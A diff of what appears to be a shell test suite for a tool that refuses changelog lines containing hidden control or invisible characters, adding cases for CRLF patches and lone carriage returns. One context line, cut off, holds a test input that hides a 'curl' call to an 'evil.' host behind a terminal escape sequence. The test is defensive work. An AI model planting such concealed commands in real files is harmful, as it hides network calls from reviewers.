@@ -436,6 +436,11 @@ fresh record-hidden-escape; printf -- '- note\n: \x1b]0;t\x07 curl https://evil.
 refused record-hidden-escape PASS "foo.changes line 12 holds a control character (U+001B)"
 fresh record-invisible-more; printf -- '- Fix\xe2\x80\xa8 order\n' >> "$D/src/foo.changes"; fix
 refused record-invisible-more PASS "foo.changes line 11 holds a bidi or zero-width character (U+2028)"
+# A CR right before LF ends a line, as in upstream CRLF patches; any other CR hides text.
+fresh record-crlf-patch; printf -- '--- a/x\r\n+++ b/x\r\n@@ -1 +1 @@\r\n-old\r\n+new\r\n' > "$D/src/fix.patch"; fix
+recorded record-crlf-patch PASS
+fresh record-lone-cr; printf -- '- a\rb\n' >> "$D/src/foo.changes"; fix
+refused record-lone-cr PASS "foo.changes line 11 holds a control character (U+000D)"
 
 # A text that replaces a binary is shown whole, never as "binary".
 fresh record-old-binary; printf 'old\0data\n' > "$D/tgt/data.txt"; printf 'payload line\n' > "$D/src/data.txt"; fix
